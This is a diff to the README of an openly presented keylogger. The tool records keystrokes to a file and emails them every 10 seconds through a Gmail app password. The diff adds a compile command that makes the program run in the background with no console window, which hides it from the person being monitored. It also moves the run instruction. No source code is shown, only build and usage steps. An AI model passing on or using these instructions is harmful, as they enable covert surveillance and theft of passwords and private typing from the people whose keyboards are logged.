@@ -28,6 +28,10 @@ The keylogger listens for keyboard events and writes the keys pressed to a file.
 
 # bash
 > gcc -o keylogger main.c -luser32
+If you want to run it in background without showing the console use this instead:
+
+>  gcc -o main.exe main.c -luser32 -lgdi32 -lws2_32 -lwinmm -mwindows
+ 
 # Prepare the Python environment:
 > Install required Python packages:
 # bash
@@ -42,9 +46,8 @@ The keylogger listens for keyboard events and writes the keys pressed to a file.
 > GMAIL_APP_PASSWORD=your_app_password
 
 # Usage
-> Run the keylogger:
-
 # bash
+Run the keylogger:
 > ./keylogger
 
 > The program will start logging keystrokes and sending emails every 10 seconds.
